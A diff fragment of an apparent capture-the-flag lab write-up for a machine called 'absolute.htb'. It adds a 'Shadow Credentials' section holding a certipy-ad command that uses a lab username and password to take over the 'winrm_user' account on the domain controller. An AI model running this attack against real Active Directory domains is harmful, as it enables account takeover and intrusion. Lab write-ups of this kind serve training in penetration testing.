@@ -569,5 +569,9 @@ The hash did not crack! So ill try a shadow credentials attack
 
 ## Shadow Credentials
 
+```python
+faketime -f +7h certipy-ad shadow auto -u 'm.lovegod@absolute.htb' -p 'AbsoluteLDAP2022!' -k -account 'winrm_user' -dc-host dc.absolute.htb -dc-ip 10.129.232.60 -ldap-scheme ldap
+```
+
 
 
